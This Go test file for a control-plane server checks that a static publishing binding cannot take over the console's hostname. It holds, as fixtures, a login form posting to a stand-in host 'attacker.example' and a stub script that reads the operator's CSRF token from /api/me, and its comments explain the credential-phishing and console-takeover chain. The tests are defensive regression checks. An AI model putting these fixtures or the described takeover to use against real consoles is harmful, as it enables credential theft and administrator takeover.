package server

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/LatticeNet/lattice-sdk/model"
	"github.com/LatticeNet/lattice-server/internal/store"
)

// consoleShadowServer stands up a control plane that serves its console at
// console.example.com, which is also the origin operators log into.
func consoleShadowServer(t *testing.T) (*Server, *store.Store) {
	t.Helper()
	st, err := store.Open("")
	if err != nil {
		t.Fatal(err)
	}
	srv, err := New(Options{
		Store:                   st,
		AdminPassword:           testAdminPass,
		PublicURL:               "https://console.example.com",
		DisableRenewalScheduler: true,
		WebFS: fstest.MapFS{
			"index.html": {Data: []byte(`<div id="app">lattice console</div>`)},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	return srv, st
}

// A static publishing binding must not be able to claim the hostname the console
// itself is served on.
//
// staticHandler consults publishing records before it falls back to the console
// SPA, and nothing compares a binding's hostname to the server's own PublicURL.
// So a binding on the console host does not sit beside the console, it replaces
// it, for every visitor, anonymously.
//
// The consequence is not a defaced page. The replacement is served from the real
// origin, under the real certificate, at the URL operators have bookmarked, so a
// login form served this way is indistinguishable from the real one and collects
// real credentials.
func TestStaticBindingCannotShadowTheConsoleOrigin(t *testing.T) {
	s, st := consoleShadowServer(t)

	if err := st.UpsertStorageBucket(model.StorageBucket{
		ID: "static_takeover", Kind: model.StorageKindStatic, Name: "takeover", IndexDocument: "index.html",
	}); err != nil {
		t.Fatal(err)
	}
	if err := st.PutStatic(model.StaticObject{
		Bucket: "takeover", Path: "index.html",
		Content:     `<form action="https://attacker.example/collect">sign in</form>`,
		ContentType: "text/html",
	}); err != nil {
		t.Fatal(err)
	}
	// The API refuses nothing here: hostname validation only checks the shape of
	// the name, never whose name it is.
	if err := st.UpsertStorageBinding(model.StorageBinding{
		ID: "bind_takeover", Kind: model.StorageKindStatic, Bucket: "takeover",
		Hostname: "console.example.com", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.Host = "console.example.com"
	rec := httptest.NewRecorder()
	s.Handler().ServeHTTP(rec, req)

	body := rec.Body.String()
	if strings.Contains(body, "attacker.example") {
		t.Fatalf("a static binding replaced the console on its own origin; %s returned %q",
			"GET / with Host console.example.com", body)
	}
	if !strings.Contains(body, "lattice console") {
		t.Fatalf("the console was not served on its own host; got %q", body)
	}
}

// The same shadowing turns a storage role into console takeover, because the
// content is same-origin and the console's own CSP says script-src 'self'.
//
// An operator holding only static:admin and static:write can publish a script
// under the console's origin, and that script runs with the operator session's
// ambient authority: it cannot read the HttpOnly cookie, but it does not need
// to. It reads the CSRF token from /api/me and then acts as a full admin.
func TestStaticBindingCannotServeScriptOnTheConsoleOrigin(t *testing.T) {
	s, st := consoleShadowServer(t)

	if err := st.UpsertStorageBucket(model.StorageBucket{
		ID: "static_payload", Kind: model.StorageKindStatic, Name: "payload",
	}); err != nil {
		t.Fatal(err)
	}
	if err := st.PutStatic(model.StaticObject{
		Bucket: "payload", Path: "evil.js",
		Content:     `fetch('/api/me').then(r=>r.json()).then(me=>{/* act as the operator */})`,
		ContentType: "application/javascript",
	}); err != nil {
		t.Fatal(err)
	}
	if err := st.UpsertStorageBinding(model.StorageBinding{
		ID: "bind_payload", Kind: model.StorageKindStatic, Bucket: "payload",
		Hostname: "console.example.com", PathPrefix: "assets-cdn", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/assets-cdn/evil.js", nil)
	req.Host = "console.example.com"
	rec := httptest.NewRecorder()
	s.Handler().ServeHTTP(rec, req)

	// The console fallback answers 200 for any unmatched path, so the status says
	// nothing. What matters is whose bytes came back.
	//
	// If they are the binding's, the CSP shipped with every response is no
	// defence: script-src 'self' admits them precisely because the binding put
	// them on the console's own origin.
	if strings.Contains(rec.Body.String(), "act as the operator") {
		t.Fatalf("a static binding served executable script on the console origin; CSP %q admits it because the bytes are same-origin",
			rec.Header().Get("Content-Security-Policy"))
	}
}
